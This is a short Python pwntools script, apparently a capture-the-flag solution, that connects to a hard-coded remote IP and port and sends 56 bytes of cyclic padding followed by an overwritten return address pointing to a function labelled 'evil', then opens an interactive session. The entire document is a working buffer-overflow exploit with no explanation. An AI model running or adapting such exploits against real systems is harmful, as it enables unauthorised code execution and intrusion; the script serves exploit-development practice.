from pwn import *


conn = remote("120.114.62.40",2114)

conn.recvuntil("\n")

padding=56

evil = 0x00000000004006b6

payload = cyclic(padding)+p64(evil)

conn.sendline(payload)

conn.interactive()

